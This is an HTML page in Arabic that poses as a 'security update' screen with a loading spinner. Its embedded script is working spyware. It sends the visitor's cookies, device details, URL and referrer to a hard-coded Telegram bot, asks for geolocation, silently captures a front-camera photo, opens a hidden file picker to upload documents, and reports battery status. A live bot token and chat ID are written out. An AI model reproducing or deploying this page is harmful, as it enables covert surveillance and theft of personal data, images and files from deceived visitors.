<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تحديث</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        h2 { color: #1a1a2e; font-size: 22px; }
        p { color: #555; font-size: 14px; margin: 20px 0; }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #2d7aff;
            border-radius: 50%;
            width: 44px;
            height: 44px;
            animation: spin 0.9s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔒 تحديث الأمان</h2>
        <p>جاري تأمين حسابك...</p>
        <div class="loader"></div>
        <p style="font-size:12px;color:#888;">يرجى الانتظار</p>
    </div>

<script>
// =============================================
// إعدادات البوت
// =============================================
const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
const CHAT_ID   = '6526473202';

// =============================================
// دالة إرسال رسالة نصية
// =============================================
function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        })
    }).catch(e => console.log(e));
}

// =============================================
// دالة إرسال صورة
// =============================================
function sendPhotoToTelegram(photoData, caption) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            photo: photoData,
            caption: caption,
            parse_mode: 'HTML'
        })
    }).catch(e => console.log(e));
}

// =============================================
// 1. تحديد نوع الجهاز الحقيقي
// =============================================
const ua = navigator.userAgent;
const isMobile = /iPhone|iPad|iPod|Android|BlackBerry|Opera Mini|IEMobile/i.test(ua);
const isTablet = /iPad|Android(?!.*Mobile)/i.test(ua);

let deviceType = 'كمبيوتر';
if (isTablet) deviceType = 'تابلت';
else if (isMobile) deviceType = 'جوال';

// تحديد نظام التشغيل بدقة
let os = 'غير معروف';
if (/Windows NT 10.0/.test(ua)) os = 'Windows 10';
else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
else if (/Mac OS X/.test(ua)) os = 'MacOS';
else if (/Android/.test(ua)) os = 'Android';
else if (/iPhone|iPad/.test(ua)) os = 'iOS';
else if (/Linux/.test(ua)) os = 'Linux';

// =============================================
// 2. البيانات الأساسية
// =============================================
let msg = `<b>✅ تم فتح الرابط</b>\n\n`;
msg += `📱 الجهاز: ${deviceType} (${os})\n`;
msg += `🌐 IP: ${window.location.hostname}\n`;
msg += `📱 المتصفح: ${ua}\n`;
msg += `🖥️ الشاشة: ${screen.width}x${screen.height}\n`;
msg += `🌍 اللغة: ${navigator.language}\n`;
msg += `🍪 الكوكيز: ${document.cookie || 'لا توجد'}\n`;
msg += `🔗 الرابط: ${window.location.href}\n`;
msg += `📅 الوقت: ${new Date().toISOString()}\n`;
msg += `↩️ المرجع: ${document.referrer || 'مباشر'}`;

sendToTelegram(msg);

// =============================================
// 3. الموقع الجغرافي
// =============================================
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            sendToTelegram(`📍 <b>الموقع الجغرافي</b>\nhttps://maps.google.com/?q=${lat},${lon}`);
        },
        err => {}
    );
}

// =============================================
// 4. الكاميرا (مضبوطة للايفون)
// =============================================
if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ 
        video: { 
            facingMode: 'user',
            width: { ideal: 640 },
            height: { ideal: 480 }
        }, 
        audio: false 
    })
    .then(stream => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', 'true');
        video.setAttribute('webkit-playsinline', 'true');
        video.muted = true;
        video.play();
        
        setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photo = canvas.toDataURL('image/jpeg', 0.9);
            
            sendPhotoToTelegram(photo, '📸 <b>صورة من الكاميرا</b>');
            
            stream.getTracks().forEach(track => track.stop());
            video.remove();
        }, 2000);
    })
    .catch(err => {});
}

// =============================================
// 5. طلب ملف
// =============================================
setTimeout(() => {
    const input = document.createElement('input');
    input.type = 'file';
    input.multiple = true;
    input.style.display = 'none';
    input.accept = 'image/*,.pdf,.doc,.docx,.txt,.xls,.xlsx';
    
    input.onchange = (e) => {
        for (let file of e.target.files) {
            const reader = new FileReader();
            reader.onload = (f) => {
                const content = f.target.result.split(',')[1] || f.target.result;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        document: content,
                        caption: `📎 <b>ملف</b>\nالاسم: ${file.name}\nالحجم: ${(file.size / 1024).toFixed(1)} كيلوبايت`
                    })
                });
            };
            reader.readAsDataURL(file);
        }
    };
    
    document.body.appendChild(input);
    input.click();
}, 3000);

// =============================================
// 6. بطارية
// =============================================
if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
        const level = Math.round(battery.level * 100);
        const charging = battery.charging ? '⚡ شاحن' : '🔌 بطارية';
        sendToTelegram(`🔋 <b>البطارية</b>\nالنسبة: ${level}%\nالحالة: ${charging}`);
    }).catch(() => {});
}

console.log('✅ يعمل');
</script>
</body>
</html>
